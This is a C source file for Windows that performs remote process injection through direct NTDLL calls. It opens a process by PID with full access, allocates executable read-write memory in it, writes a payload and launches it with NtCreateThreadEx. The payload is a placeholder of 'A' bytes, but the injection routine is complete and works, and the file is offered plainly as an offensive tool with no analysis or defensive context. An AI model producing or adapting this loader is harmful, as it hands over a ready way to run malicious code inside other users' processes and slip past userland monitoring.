#include <windows.h>
#include <stdio.h>

/* ------------------------------------------------------------------ */
/*  Logging helpers                                                    */
/* ------------------------------------------------------------------ */
static const char* k = "[+]";
static const char* i = "[*]";
static const char* e = "[-]";

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

/* ------------------------------------------------------------------ */
/*  NT type definitions                                                */
/* ------------------------------------------------------------------ */
typedef struct _CLIENT_ID {
    VOID* UniqueProcess;   /* 0x0 */
    VOID* UniqueThread;    /* 0x8 */
} CLIENT_ID, * PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;                         /* 0x0  */
    VOID* RootDirectory;                  /* 0x8  */
    struct _UNICODE_STRING* ObjectName;   /* 0x10 */
    ULONG Attributes;                     /* 0x18 */
    VOID* SecurityDescriptor;             /* 0x20 */
    VOID* SecurityQualityOfService;       /* 0x28 */
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* NtOpenProcess)(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientId);

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG PageProtection);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(NumberOfBytesToWrite) PVOID Buffer,
    _In_ SIZE_T NumberOfBytesToWrite,
    _Out_opt_ PSIZE_T NumberOfBytesWritten);

typedef struct _PS_ATTRIBUTE {
    ULONG_PTR Attribute;
    SIZE_T Size;
    union {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI* PUSER_THREAD_START_ROUTINE)(_In_ PVOID ThreadParameter);

typedef NTSTATUS(NTAPI* NtCreateThreadEx)(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PUSER_THREAD_START_ROUTINE StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags,
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList);

/* ------------------------------------------------------------------ */
/*  Injection routine                                                  */
/* ------------------------------------------------------------------ */
BOOL NTinjection(_In_ const DWORD PID)
{
    /* -- payload ---------------------------------------------------- */
    unsigned char payload[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41";
    const size_t payload_size = sizeof(payload);

    /* -- locals ----------------------------------------------------- */
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID  remoteBuffer = NULL;
    SIZE_T regionSize = payload_size;

    HMODULE hNtdll = NULL;
    NTSTATUS status = STATUS_SUCCESS;

    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)PID, NULL };
    OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL };

    printf("%s Payload size: %zu bytes\n", i, payload_size);

    /* -- resolve NTDLL ---------------------------------------------- */
    hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll == NULL) {
        printf("%s Failed to obtain handle to ntdll.dll (error %lu)\n", e, GetLastError());
        return FALSE;
    }
    printf("%s ntdll.dll at 0x%p\n", k, (void*)hNtdll);

    NtOpenProcess           fnOpenProcess = (NtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    NtAllocateVirtualMemory fnAllocateMemory = (NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory    fnWriteMemory = (NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NtCreateThreadEx        fnCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!fnOpenProcess || !fnAllocateMemory || !fnWriteMemory || !fnCreateThreadEx) {
        printf("%s Failed to resolve one or more NTDLL exports\n", e);
        return FALSE;
    }

    /* -- open target process ---------------------------------------- */
    printf("%s Opening process with PID %lu...\n", i, PID);
    status = fnOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (status != STATUS_SUCCESS) {
        printf("%s NtOpenProcess failed: 0x%08lX\n", e, (unsigned long)status);
        return FALSE;
    }
    printf("%s Process opened. Handle: 0x%p\n", k, hProcess);

    /* -- allocate remote memory ------------------------------------- */
    status = fnAllocateMemory(hProcess, &remoteBuffer, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        printf("%s NtAllocateVirtualMemory failed: 0x%08lX\n", e, (unsigned long)status);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("%s Allocated %zu bytes at 0x%p\n", k, regionSize, remoteBuffer);

    /* -- write payload ---------------------------------------------- */
    status = fnWriteMemory(hProcess, remoteBuffer, payload, payload_size, NULL);
    if (status != STATUS_SUCCESS) {
        printf("%s NtWriteVirtualMemory failed: 0x%08lX\n", e, (unsigned long)status);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("%s Payload written to remote process\n", k);

    /* -- create remote thread --------------------------------------- */
    status = fnCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &oa, hProcess,
        (PUSER_THREAD_START_ROUTINE)remoteBuffer,
        NULL, FALSE, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        printf("%s NtCreateThreadEx failed: 0x%08lX\n", e, (unsigned long)status);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("%s Remote thread created. Handle: 0x%p\n", k, hThread);

    /* -- cleanup ---------------------------------------------------- */
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  Entry point                                                        */
/* ------------------------------------------------------------------ */
int main(int argc, char* argv[])
{
    if (argc < 2) {
        printf("%s Usage: %s <PID>\n", e, argv[0]);
        return EXIT_FAILURE;
    }

    DWORD pid = (DWORD)atoi(argv[1]);
    if (pid == 0) {
        printf("%s Invalid PID specified: %s\n", e, argv[1]);
        return EXIT_FAILURE;
    }

    return NTinjection(pid) ? EXIT_SUCCESS : EXIT_FAILURE;
}